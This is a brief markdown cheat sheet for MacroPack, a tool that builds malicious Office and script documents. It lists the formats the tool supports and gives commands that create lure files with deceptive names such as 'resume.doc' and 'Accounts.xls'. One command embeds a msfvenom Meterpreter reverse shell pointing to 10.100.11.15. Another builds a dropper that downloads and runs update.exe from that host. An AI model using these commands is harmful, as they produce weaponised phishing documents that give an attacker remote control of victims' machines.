## Supported Formats

- Scripting formats:
• VBA text file (.vba)
• VBS text file (.vos)
• Windows Script File (.wsf)
• HTML Applications (.hta)
- MS Office Supported formats:
• MS Word (.doc, docm, docx, .dotm)
• MS Excel (.xls, xlsm, xlsx, .xltm)
• MS PowerPoint (.pptm, potm)
• MS Access (.accdb, mdb)

## MacroPack GitHub Repo: 
```
https://github.com/sevagas/macro_pack
```
- Usage
```
echo "calc.exe" | .\macro_pack.exe -t CMD -o -G output.doc
```
## Normal Reverse shell
```
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=10.100.11.15 | .\macro_pack.exe -o -G "resume.doc"
```

## Reverse Shelll with Dropper
```
echo "http://10.100.11.15/update.exe" "update.exe" | . \macro_pack -t DROPPER -0 -G "Accounts.xls"
```
